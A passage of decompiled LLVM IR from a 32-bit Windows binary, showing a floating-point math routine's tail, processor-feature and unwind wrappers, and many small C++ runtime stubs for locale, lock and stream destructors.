  %65 = call i128 @__asm_andpd(i128 %36, i128 %64), !insn.addr !10478
  %66 = call i128 @__asm_addpd(i128 %34, i128 %60), !insn.addr !10479
  %67 = call i128 @__asm_addpd(i128 %66, i128 %65), !insn.addr !10480
  %68 = call i128 @__asm_mulpd(i128 %54, i128 %37), !insn.addr !10481
  %69 = call i128 @__asm_mulsd(i128 %57, i128 %37), !insn.addr !10482
  %70 = call i128 @__asm_addpd(i128 %68, i128 %56), !insn.addr !10483
  %71 = load i128, i128* @global_var_10038920, align 4, !insn.addr !10484
  %72 = call i128 @__asm_movapd(i128 %71), !insn.addr !10484
  %73 = call i128 @__asm_mulpd(i128 %72, i128 %37), !insn.addr !10485
  %74 = call i128 @__asm_movapd(i128 %67), !insn.addr !10486
  %75 = call i128 @__asm_unpckhpd(i128 %74, i128 %74), !insn.addr !10487
  %76 = call i128 @__asm_mulpd(i128 %70, i128 %69), !insn.addr !10488
  %77 = call i128 @__asm_movapd(i128 %76), !insn.addr !10489
  %78 = call i128 @__asm_addpd(i128 %76, i128 %73), !insn.addr !10490
  %79 = call i128 @__asm_unpckhpd(i128 %77, i128 %77), !insn.addr !10491
  %80 = call i128 @__asm_addsd(i128 %79, i128 %78), !insn.addr !10492
  %81 = call i128 @__asm_addsd(i128 %80, i128 %75), !insn.addr !10493
  %82 = call i128 @__asm_addsd(i128 %81, i128 %67), !insn.addr !10494
  %83 = bitcast double %0 to i64, !insn.addr !10495
  call void @__asm_movlpd(i64 %83, i128 %82), !insn.addr !10495
  %84 = fpext double %0 to x86_fp80, !insn.addr !10496
  ret x86_fp80 %84, !insn.addr !10497

dec_label_pc_1002bba6:                            ; preds = %dec_label_pc_1002ba53
  %85 = call i128 @__asm_movlpd.38(i128 %37, i64 %arg1), !insn.addr !10498
  %86 = call i128 @__asm_movapd(i128 %6), !insn.addr !10499
  %87 = call i128 @__asm_cmpeqsd(i128 %86, i128 %85), !insn.addr !10500
  %88 = call i32 @__asm_pextrw(i128 %87, i32 0), !insn.addr !10501
  %89 = icmp eq i32 %88, 0, !insn.addr !10502
  br i1 %89, label %dec_label_pc_1002bbc3, label %dec_label_pc_1002bc0b, !insn.addr !10503

dec_label_pc_1002bbc3:                            ; preds = %dec_label_pc_1002bba6
  %90 = icmp eq i32 %38, 0, !insn.addr !10504
  br i1 %90, label %dec_label_pc_1002bc26, label %dec_label_pc_1002bbc8, !insn.addr !10505

dec_label_pc_1002bbc8:                            ; preds = %dec_label_pc_1002bbc3
  %91 = icmp ult i32 %39, 2047
  br i1 %91, label %dec_label_pc_1002bbd0, label %dec_label_pc_1002bc3c, !insn.addr !10506

dec_label_pc_1002bbd0:                            ; preds = %dec_label_pc_1002bbc8
  %92 = call i128 @__asm_movlpd.38(i128 %85, i64 %arg1), !insn.addr !10507
  %93 = call i128 @__asm_movapd(i128 %1), !insn.addr !10508
  %94 = call i128 @__asm_movapd(i128 %3), !insn.addr !10509
  %95 = call i128 @__asm_andpd(i128 %92, i128 %93), !insn.addr !10510
  %96 = call i128 @__asm_orpd(i128 %95, i128 %94), !insn.addr !10511
  %97 = call i128 @__asm_cmpeqsd(i128 %94, i128 %96), !insn.addr !10512
  %98 = call i32 @__asm_pextrw(i128 %97, i32 0), !insn.addr !10513
  %99 = icmp eq i32 %98, 0, !insn.addr !10514
  store i128 %93, i128* %xmm1.0.reg2mem, !insn.addr !10515
  br i1 %99, label %dec_label_pc_1002bc5a, label %dec_label_pc_1002bbfd, !insn.addr !10515

dec_label_pc_1002bbfd:                            ; preds = %dec_label_pc_1002bbd0
  ret x86_fp80 0xK7FFF8000000000000000, !insn.addr !10516

dec_label_pc_1002bc0b:                            ; preds = %dec_label_pc_1002bba6
  %100 = call i128 @__asm_movlpd.38(i128 %13, i64 %7), !insn.addr !10517
  %101 = call i128 @__asm_divsd(i128 %100, i128 %85), !insn.addr !10518
  %102 = call i128 @__asm_movlpd.38(i128 %87, i64 -4503599627370496), !insn.addr !10519
  store i128 %102, i128* %xmm1.0.reg2mem, !insn.addr !10520
  br label %dec_label_pc_1002bc5a, !insn.addr !10520

dec_label_pc_1002bc26:                            ; preds = %dec_label_pc_1002bbc3
  %103 = call i128 @__asm_movlpd.38(i128 %87, i64 4841369599423283200), !insn.addr !10521
  %104 = call i128 @__asm_mulsd(i128 %85, i128 %103), !insn.addr !10522
  store i128 %104, i128* %xmm0.0.reg2mem, !insn.addr !10523
  store i32 -1075, i32* %storemerge.reg2mem, !insn.addr !10523
  br label %dec_label_pc_1002ba53, !insn.addr !10523

dec_label_pc_1002bc3c:                            ; preds = %dec_label_pc_1002bbc8
  %105 = and i32 %11, 2047, !insn.addr !10524
  %106 = icmp ne i32 %105, 2047, !insn.addr !10525
  %107 = icmp eq i1 %106, false, !insn.addr !10526
  br i1 %107, label %dec_label_pc_1002bc87, label %dec_label_pc_1002bc4d, !insn.addr !10526

dec_label_pc_1002bc4d:                            ; preds = %dec_label_pc_1002bc87, %dec_label_pc_1002bc3c
  %108 = call i128 @__asm_xorpd(i128 %87, i128 %87), !insn.addr !10527
  %109 = call i128 @__asm_divsd(i128 %108, i128 %108), !insn.addr !10528
  store i128 %109, i128* %xmm1.0.reg2mem, !insn.addr !10529
  br label %dec_label_pc_1002bc5a, !insn.addr !10529

dec_label_pc_1002bc5a:                            ; preds = %dec_label_pc_1002bc87, %dec_label_pc_1002bbd0, %dec_label_pc_1002bc4d, %dec_label_pc_1002bc0b
  %xmm1.0.reload = load i128, i128* %xmm1.0.reg2mem
  %110 = bitcast double %0 to i64, !insn.addr !10530
  call void @__asm_movlpd(i64 %110, i128 %xmm1.0.reload), !insn.addr !10530
  %111 = call i32 @___libm_error_support(), !insn.addr !10531
  %112 = fpext double %0 to x86_fp80, !insn.addr !10532
  ret x86_fp80 %112, !insn.addr !10533

dec_label_pc_1002bc87:                            ; preds = %dec_label_pc_1002bc3c
  %113 = call i128 @__asm_movlpd.38(i128 %13, i64 %arg1), !insn.addr !10534
  %114 = call i128 @__asm_movlpd.38(i128 %85, i64 %arg1), !insn.addr !10535
  %115 = call i32 @__asm_movd.36(i128 %113), !insn.addr !10536
  %116 = call i128 @__asm_psrlq(i128 %113, i32 32), !insn.addr !10537
  %117 = call i32 @__asm_movd.36(i128 %116), !insn.addr !10538
  %118 = and i32 %117, 1048575, !insn.addr !10539
  %119 = or i32 %118, %115, !insn.addr !10540
  %120 = icmp eq i32 %119, 0, !insn.addr !10541
  store i128 %87, i128* %xmm1.0.reg2mem, !insn.addr !10542
  br i1 %120, label %dec_label_pc_1002bc4d, label %dec_label_pc_1002bc5a, !insn.addr !10542
}

define i32 @function_1002bcbb() local_unnamed_addr {
dec_label_pc_1002bcbb:
  %0 = call i32 @__ceil_default(), !insn.addr !10543
  ret i32 %0, !insn.addr !10543
}

declare i32 @__ceil_default() local_unnamed_addr

define i1 @"_IsProcessorFeaturePresent@4"(i32 %ProcessorFeature) local_unnamed_addr {
dec_label_pc_1002bd7a:
  %0 = call i1 @IsProcessorFeaturePresent(i32 %ProcessorFeature), !insn.addr !10544
  ret i1 %0, !insn.addr !10544
}

define void @"_RtlUnwind@16"(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue) local_unnamed_addr {
dec_label_pc_1002bd80:
  call void @RtlUnwind(i32* %TargetFrame, i32* %TargetIp, %_EXCEPTION_RECORD* %ExceptionRecord, i32* %ReturnValue), !insn.addr !10545
  ret void, !insn.addr !10545
}

declare i32 @__SEH_prolog4_GS(i32*, i32) local_unnamed_addr

declare i32 @__SEH_epilog4_GS() local_unnamed_addr

define i32 @__ftol2_sse() local_unnamed_addr {
dec_label_pc_1002c1b0:
  %0 = call x86_fp80 @__decompiler_undefined_function_19()
  %1 = load i32, i32* @global_var_1003e57c, align 4, !insn.addr !10546
  %2 = icmp eq i32 %1, 0, !insn.addr !10546
  br i1 %2, label %3, label %dec_label_pc_1002c1b9, !insn.addr !10547

; <label>:3:                                      ; preds = %dec_label_pc_1002c1b0
  %4 = call i32 @__ftol2(), !insn.addr !10547
  br label %dec_label_pc_1002c1b9, !insn.addr !10547

dec_label_pc_1002c1b9:                            ; preds = %3, %dec_label_pc_1002c1b0
  %5 = fptrunc x86_fp80 %0 to float, !insn.addr !10548
  %6 = bitcast float %5 to i32, !insn.addr !10548
  %7 = sext i32 %6 to i64, !insn.addr !10549
  %8 = call i32 @__asm_cvttsd2si(i64 %7), !insn.addr !10549
  ret i32 %8, !insn.addr !10550
}

declare i32 @__ftol2() local_unnamed_addr

define i32 @function_1002c460() local_unnamed_addr {
dec_label_pc_1002c460:
  %0 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !10551
  ret i32 %0, !insn.addr !10551
}

define i32 @function_1002c468() local_unnamed_addr {
dec_label_pc_1002c468:
  %0 = call i32 @function_10004340(), !insn.addr !10552
  ret i32 %0, !insn.addr !10552
}

define i32 @function_1002c473() local_unnamed_addr {
dec_label_pc_1002c473:
  %0 = call i32 @function_10004340(), !insn.addr !10553
  ret i32 %0, !insn.addr !10553
}

define i32 @function_1002c47e() local_unnamed_addr {
dec_label_pc_1002c47e:
  %0 = call i32 @function_10004340(), !insn.addr !10554
  ret i32 %0, !insn.addr !10554
}

define i32 @function_1002c489() local_unnamed_addr {
dec_label_pc_1002c489:
  %0 = call i32 @function_10004340(), !insn.addr !10555
  ret i32 %0, !insn.addr !10555
}

define i32 @function_1002c494() local_unnamed_addr {
dec_label_pc_1002c494:
  %0 = call i32 @function_10004340(), !insn.addr !10556
  ret i32 %0, !insn.addr !10556
}

define i32 @function_1002c49f() local_unnamed_addr {
dec_label_pc_1002c49f:
  %0 = call i32 @function_10004340(), !insn.addr !10557
  ret i32 %0, !insn.addr !10557
}

define i32 @function_1002c510() local_unnamed_addr {
dec_label_pc_1002c510:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -20, !insn.addr !10558
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10558
  %3 = load i32, i32* %2, align 4, !insn.addr !10558
  %4 = inttoptr i32 %3 to i32*, !insn.addr !10559
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 24), !insn.addr !10559
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !10560
}

define i32 @function_1002c51f(i32 %arg1) local_unnamed_addr {
dec_label_pc_1002c51f:
  %0 = call i32 @"@__security_check_cookie@4"(), !insn.addr !10561
  %1 = call i32 @___CxxFrameHandler(), !insn.addr !10562
  ret i32 %1, !insn.addr !10562
}

define i32 @function_1002c540() local_unnamed_addr {
dec_label_pc_1002c540:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10563
  ret i32 %0, !insn.addr !10563
}

define i32 @function_1002c54b() local_unnamed_addr {
dec_label_pc_1002c54b:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10564
  ret i32 %0, !insn.addr !10564
}

define i32 @function_1002c553(i32 %arg1) local_unnamed_addr {
dec_label_pc_1002c553:
  %0 = call i32 @"@__security_check_cookie@4"(), !insn.addr !10565
  %1 = call i32 @"@__security_check_cookie@4"(), !insn.addr !10566
  %2 = call i32 @___CxxFrameHandler(), !insn.addr !10567
  ret i32 %2, !insn.addr !10567
}

define i32 @function_1002c580() local_unnamed_addr {
dec_label_pc_1002c580:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10568
  ret i32 %0, !insn.addr !10568
}

define i32 @function_1002c588(i32 %arg1) local_unnamed_addr {
dec_label_pc_1002c588:
  %0 = call i32 @"@__security_check_cookie@4"(), !insn.addr !10569
  %1 = call i32 @"@__security_check_cookie@4"(), !insn.addr !10570
  %2 = call i32 @___CxxFrameHandler(), !insn.addr !10571
  ret i32 %2, !insn.addr !10571
}

define i32 @function_1002c5d0() local_unnamed_addr {
dec_label_pc_1002c5d0:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10572
  ret i32 %0, !insn.addr !10572
}

define i32 @function_1002c5d8() local_unnamed_addr {
dec_label_pc_1002c5d8:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10573
  ret i32 %0, !insn.addr !10573
}

define i32 @function_1002c610() local_unnamed_addr {
dec_label_pc_1002c610:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10574
  ret i32 %0, !insn.addr !10574
}

define i32 @function_1002c61b() local_unnamed_addr {
dec_label_pc_1002c61b:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10575
  ret i32 %0, !insn.addr !10575
}

define i32 @function_1002c626() local_unnamed_addr {
dec_label_pc_1002c626:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10576
  ret i32 %0, !insn.addr !10576
}

define i32 @function_1002c631() local_unnamed_addr {
dec_label_pc_1002c631:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10577
  ret i32 %0, !insn.addr !10577
}

define i32 @function_1002c63c() local_unnamed_addr {
dec_label_pc_1002c63c:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10578
  ret i32 %0, !insn.addr !10578
}

define i32 @function_1002c644() local_unnamed_addr {
dec_label_pc_1002c644:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10579
  ret i32 %0, !insn.addr !10579
}

define i32 @function_1002c64c() local_unnamed_addr {
dec_label_pc_1002c64c:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10580
  ret i32 %0, !insn.addr !10580
}

define i32 @function_1002c654() local_unnamed_addr {
dec_label_pc_1002c654:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -208, !insn.addr !10581
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10582
  %3 = call i32 @"??_M@YGXPAXIIP6EX0@Z@Z"(i32* %2, i32 ptrtoint (i32* @1 to i32), i32 ptrtoint (i32* @1 to i32), void (i32*)* bitcast (i32* @1 to void (i32*)*)), !insn.addr !10582
  ret i32 %3, !insn.addr !10583
}

define i32 @function_1002c66a() local_unnamed_addr {
dec_label_pc_1002c66a:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10584
  ret i32 %0, !insn.addr !10584
}

define i32 @function_1002c675() local_unnamed_addr {
dec_label_pc_1002c675:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10585
  ret i32 %0, !insn.addr !10585
}

define i32 @function_1002c6b0() local_unnamed_addr {
dec_label_pc_1002c6b0:
  %0 = call i32 @function_10005450(), !insn.addr !10586
  ret i32 %0, !insn.addr !10586
}

define i32 @function_1002c6b8() local_unnamed_addr {
dec_label_pc_1002c6b8:
  %0 = call i32 @function_10004680(), !insn.addr !10587
  ret i32 %0, !insn.addr !10587
}

define i32 @function_1002c6c0() local_unnamed_addr {
dec_label_pc_1002c6c0:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10588
  ret i32 %0, !insn.addr !10588
}

define i32 @function_1002c710() local_unnamed_addr {
dec_label_pc_1002c710:
  %0 = call i32 @function_10005450(), !insn.addr !10589
  ret i32 %0, !insn.addr !10589
}

define i32 @function_1002c740() local_unnamed_addr {
dec_label_pc_1002c740:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10590
  ret i32 %0, !insn.addr !10590
}

define i32 @function_1002c770() local_unnamed_addr {
dec_label_pc_1002c770:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10591
  ret i32 %0, !insn.addr !10591
}

define i32 @function_1002c778() local_unnamed_addr {
dec_label_pc_1002c778:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10592
  ret i32 %0, !insn.addr !10592
}

define i32 @function_1002c7b0() local_unnamed_addr {
dec_label_pc_1002c7b0:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10593
  ret i32 %0, !insn.addr !10593
}

define i32 @function_1002c7b8() local_unnamed_addr {
dec_label_pc_1002c7b8:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10594
  ret i32 %0, !insn.addr !10594
}

define i32 @function_1002c7c0() local_unnamed_addr {
dec_label_pc_1002c7c0:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10595
  ret i32 %0, !insn.addr !10595
}

define i32 @function_1002c7c8() local_unnamed_addr {
dec_label_pc_1002c7c8:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10596
  ret i32 %0, !insn.addr !10596
}

define i32 @function_1002c800() local_unnamed_addr {
dec_label_pc_1002c800:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10597
  ret i32 %0, !insn.addr !10597
}

define i32 @function_1002c808() local_unnamed_addr {
dec_label_pc_1002c808:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10598
  ret i32 %0, !insn.addr !10598
}

define i32 @function_1002c810() local_unnamed_addr {
dec_label_pc_1002c810:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10599
  ret i32 %0, !insn.addr !10599
}

define i32 @function_1002c818() local_unnamed_addr {
dec_label_pc_1002c818:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10600
  ret i32 %0, !insn.addr !10600
}

define i32 @function_1002c870() local_unnamed_addr {
dec_label_pc_1002c870:
  %0 = call i32 @function_10004680(), !insn.addr !10601
  ret i32 %0, !insn.addr !10601
}

define i32 @function_1002c8c0() local_unnamed_addr {
dec_label_pc_1002c8c0:
  %0 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !10602
  ret i32 %0, !insn.addr !10602
}

define i32 @function_1002c8f0() local_unnamed_addr {
dec_label_pc_1002c8f0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -16, !insn.addr !10603
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10603
  %3 = load i32, i32* %2, align 4, !insn.addr !10603
  %4 = and i32 %3, 1, !insn.addr !10604
  %5 = icmp eq i32 %4, 0, !insn.addr !10604
  br i1 %5, label %dec_label_pc_1002c908, label %dec_label_pc_1002c8fc, !insn.addr !10605

dec_label_pc_1002c8fc:                            ; preds = %dec_label_pc_1002c8f0
  %6 = and i32 %3, -2, !insn.addr !10606
  store i32 %6, i32* %2, align 4, !insn.addr !10606
  %7 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10607
  ret i32 %7, !insn.addr !10607

dec_label_pc_1002c908:                            ; preds = %dec_label_pc_1002c8f0
  ret i32 0, !insn.addr !10608
}

define i32 @function_1002c930() local_unnamed_addr {
dec_label_pc_1002c930:
  %0 = call i32 @function_10005450(), !insn.addr !10609
  ret i32 %0, !insn.addr !10609
}

define i32 @function_1002c938() local_unnamed_addr {
dec_label_pc_1002c938:
  %0 = call i32 @function_10004680(), !insn.addr !10610
  ret i32 %0, !insn.addr !10610
}

define i32 @function_1002c960() local_unnamed_addr {
dec_label_pc_1002c960:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10611
  ret i32 %0, !insn.addr !10611
}

define i32 @function_1002c990() local_unnamed_addr {
dec_label_pc_1002c990:
  %0 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !10612
  ret i32 %0, !insn.addr !10612
}

define i32 @function_1002c998() local_unnamed_addr {
dec_label_pc_1002c998:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -16, !insn.addr !10613
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10613
  %3 = load i32, i32* %2, align 4, !insn.addr !10613
  %4 = inttoptr i32 %3 to i32*, !insn.addr !10614
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 8), !insn.addr !10614
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !10615
}

define i32 @function_1002c9d0() local_unnamed_addr {
dec_label_pc_1002c9d0:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, 8, !insn.addr !10616
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10616
  %3 = load i32, i32* %2, align 4, !insn.addr !10616
  %4 = inttoptr i32 %3 to i32*, !insn.addr !10617
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 24), !insn.addr !10617
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !10618
}

define i32 @function_1002c9df() local_unnamed_addr {
dec_label_pc_1002c9df:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -16, !insn.addr !10619
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10619
  %3 = load i32, i32* %2, align 4, !insn.addr !10619
  %4 = and i32 %3, 1, !insn.addr !10620
  %5 = icmp eq i32 %4, 0, !insn.addr !10620
  br i1 %5, label %dec_label_pc_1002c9f7, label %dec_label_pc_1002c9eb, !insn.addr !10621

dec_label_pc_1002c9eb:                            ; preds = %dec_label_pc_1002c9df
  %6 = and i32 %3, -2, !insn.addr !10622
  store i32 %6, i32* %2, align 4, !insn.addr !10622
  %7 = call i32 @"??1_Locinfo@std@@QAE@XZ"(), !insn.addr !10623
  ret i32 %7, !insn.addr !10623

dec_label_pc_1002c9f7:                            ; preds = %dec_label_pc_1002c9df
  ret i32 0, !insn.addr !10624
}

define i32 @function_1002c9f8() local_unnamed_addr {
dec_label_pc_1002c9f8:
  %0 = call i32 @function_100015a0(), !insn.addr !10625
  ret i32 %0, !insn.addr !10625
}

define i32 @function_1002ca20() local_unnamed_addr {
dec_label_pc_1002ca20:
  %0 = call i32 @function_10005450(), !insn.addr !10626
  ret i32 %0, !insn.addr !10626
}

define i32 @function_1002ca28() local_unnamed_addr {
dec_label_pc_1002ca28:
  %0 = call i32 @function_10004680(), !insn.addr !10627
  ret i32 %0, !insn.addr !10627
}

define i32 @function_1002ca50() local_unnamed_addr {
dec_label_pc_1002ca50:
  %0 = call i32 @"??1locale@std@@QAE@XZ"(), !insn.addr !10628
  ret i32 %0, !insn.addr !10628
}

define i32 @function_1002ca9b() local_unnamed_addr {
dec_label_pc_1002ca9b:
  %0 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !10629
  ret i32 %0, !insn.addr !10629
}

define i32 @function_1002cb2b() local_unnamed_addr {
dec_label_pc_1002cb2b:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10630
  ret i32 %0, !insn.addr !10630
}

define i32 @function_1002cb58() local_unnamed_addr {
dec_label_pc_1002cb58:
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = add i32 %0, -16, !insn.addr !10631
  %2 = inttoptr i32 %1 to i32*, !insn.addr !10631
  %3 = load i32, i32* %2, align 4, !insn.addr !10631
  %4 = inttoptr i32 %3 to i32*, !insn.addr !10632
  call void @"??3@YAXPAXI@Z"(i32* %4, i32 8), !insn.addr !10632
  ret i32 ptrtoint (i32* @1 to i32), !insn.addr !10633
}

define i32 @function_1002cb9b() local_unnamed_addr {
dec_label_pc_1002cb9b:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10634
  ret i32 %0, !insn.addr !10634
}

define i32 @function_1002cbc8() local_unnamed_addr {
dec_label_pc_1002cbc8:
  %0 = call i32 @function_10004430(i32 ptrtoint (i32* @1 to i32)), !insn.addr !10635
  ret i32 %0, !insn.addr !10635
}

define i32 @function_1002cc10() local_unnamed_addr {
dec_label_pc_1002cc10:
  %0 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !10636
  ret i32 %0, !insn.addr !10636
}

define i32 @function_1002cc33() local_unnamed_addr {
dec_label_pc_1002cc33:
  %0 = call i32 @"??1_Lockit@std@@QAE@XZ"(), !insn.addr !10637
  ret i32 %0, !insn.addr !10637
}

define i32 @function_1002cc80() local_unnamed_addr {
dec_label_pc_1002cc80:
  %ebx.0.reg2mem = alloca i32, !insn.addr !10638
  %0 = call i32 @__decompiler_undefined_function_1()
  %1 = call i32 @function_10004670(), !insn.addr !10639
  %2 = load i32, i32* @global_var_10040a2c, align 4, !insn.addr !10640
  %3 = icmp ult i32 %2, 16, !insn.addr !10640
  br i1 %3, label %dec_label_pc_1002ccda, label %dec_label_pc_1002cc93, !insn.addr !10641

dec_label_pc_1002cc93:                            ; preds = %dec_label_pc_1002cc80
  %4 = load i32, i32* @global_var_10040a18, align 4, !insn.addr !10642
  %5 = call i32 @function_10006ee0(i32* nonnull @global_var_10040a18, i32 %0), !insn.addr !10643
  %6 = load i32, i32* @global_var_10040a2c, align 4, !insn.addr !10644
  %7 = add i32 %6, 1, !insn.addr !10645
  %8 = icmp ult i32 %7, 4096, !insn.addr !10646
  store i32 %4, i32* %ebx.0.reg2mem, !insn.addr !10647
  br i1 %8, label %dec_label_pc_1002ccd0, label %dec_label_pc_1002ccb6, !insn.addr !10647

dec_label_pc_1002ccb6:                            ; preds = %dec_label_pc_1002cc93
  %9 = and i32 %4, 31
  %10 = icmp eq i32 %9, 0, !insn.addr !10648
  %11 = icmp eq i1 %10, false, !insn.addr !10649
  br i1 %11, label %dec_label_pc_1002ccff, label %dec_label_pc_1002ccbb, !insn.addr !10649

dec_label_pc_1002ccbb:                            ; preds = %dec_label_pc_1002ccb6
  %12 = add i32 %4, -4, !insn.addr !10650
  %13 = inttoptr i32 %12 to i32*, !insn.addr !10650
  %14 = load i32, i32* %13, align 4, !insn.addr !10650
  %15 = icmp ugt i32 %4, %14, !insn.addr !10651
  %16 = icmp eq i1 %15, false, !insn.addr !10652
  br i1 %16, label %dec_label_pc_1002cd04, label %dec_label_pc_1002ccc2, !insn.addr !10652

dec_label_pc_1002ccc2:                            ; preds = %dec_label_pc_1002ccbb
  %17 = sub i32 %4, %14, !insn.addr !10653
  %18 = icmp ult i32 %17, 4, !insn.addr !10654
  br i1 %18, label %dec_label_pc_1002cd09, label %dec_label_pc_1002ccc9, !insn.addr !10655

dec_label_pc_1002ccc9:                            ; preds = %dec_label_pc_1002ccc2
  %19 = icmp ult i32 %17, 36
  store i32 %14, i32* %ebx.0.reg2mem, !insn.addr !10656
  br i1 %19, label %dec_label_pc_1002ccd0, label %dec_label_pc_1002cd0e, !insn.addr !10656

dec_label_pc_1002ccd0:                            ; preds = %dec_label_pc_1002ccc9, %dec_label_pc_1002cc93
  %ebx.0.reload = load i32, i32* %ebx.0.reg2mem
  %20 = inttoptr i32 %ebx.0.reload to i32*, !insn.addr !10657
  call void @_free(i32* %20), !insn.addr !10657
  br label %dec_label_pc_1002ccda, !insn.addr !10658

dec_label_pc_1002ccda:                            ; preds = %dec_label_pc_1002ccd0, %dec_label_pc_1002cc80
  store i32 0, i32* @global_var_10040a28, align 4, !insn.addr !10659
  store i32 15, i32* @global_var_10040a2c, align 4, !insn.addr !10660
  store i8 0, i8* bitcast (i32* @global_var_10040a18 to i8*), align 4, !insn.addr !10661
  %21 = call i32 @function_10004670(), !insn.addr !10662
  ret i32 %21, !insn.addr !10662

dec_label_pc_1002ccff:                            ; preds = %dec_label_pc_1002ccb6
  %22 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !10663
  br label %dec_label_pc_1002cd04, !insn.addr !10663

dec_label_pc_1002cd04:                            ; preds = %dec_label_pc_1002ccff, %dec_label_pc_1002ccbb
  %23 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !10664
  br label %dec_label_pc_1002cd09, !insn.addr !10664

dec_label_pc_1002cd09:                            ; preds = %dec_label_pc_1002cd04, %dec_label_pc_1002ccc2
  %24 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !10665
  br label %dec_label_pc_1002cd0e, !insn.addr !10665

dec_label_pc_1002cd0e:                            ; preds = %dec_label_pc_1002ccc9, %dec_label_pc_1002cd09
  %25 = call i32 @__invalid_parameter_noinfo_noreturn(), !insn.addr !10666
  %26 = call i32 @__asm_int3(), !insn.addr !10667
  %27 = call i32 @__asm_int3(), !insn.addr !10668
  %28 = call i32 @__asm_int3(), !insn.addr !10669
  %29 = call i32 @__asm_int3(), !insn.addr !10670
  %30 = call i32 @__asm_int3(), !insn.addr !10671
  %31 = call i32 @__asm_int3(), !insn.addr !10672
  %32 = call i32 @__asm_int3(), !insn.addr !10673
  %33 = call i32 @__asm_int3(), !insn.addr !10674
  %34 = call i32 @__asm_int3(), !insn.addr !10675
  %35 = call i32 @__asm_int3(), !insn.addr !10676
  %36 = call i32 @__asm_int3(), !insn.addr !10677
  %37 = call i32 @__asm_int3(), !insn.addr !10678
  %38 = call i32 @__asm_int3(), !insn.addr !10679
  ret i32 %38, !insn.addr !10680
}

define i32 @"??__Finitlocks@@YAXXZ"() local_unnamed_addr {
dec_label_pc_1002cd21:
  %0 = call i32 @"??1_Init_locks@std@@QAE@XZ"(), !insn.addr !10681
  ret i32 %0, !insn.addr !10681
}

define i32 @"??__Fcerr@std@@YAXXZ"() local_unnamed_addr {
dec_label_pc_1002cd2b:
  %0 = call i32 @"??_D?$basic_ostream@DU?$char_traits@D@std@@@std@@QAEXXZ"(), !insn.addr !10682
  ret i32 %0, !insn.addr !10682
}

define i32 @"??__Ffout@std@@YAXXZ"() local_unnamed_addr {
dec_label_pc_1002cd35:
  %0 = call i32 @"??1?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAE@XZ"(), !insn.addr !10683
  ret i32 %0, !insn.addr !10683
}

define i32 @"??__Finitlocks@@YAXXZ.45"() local_unnamed_addr {
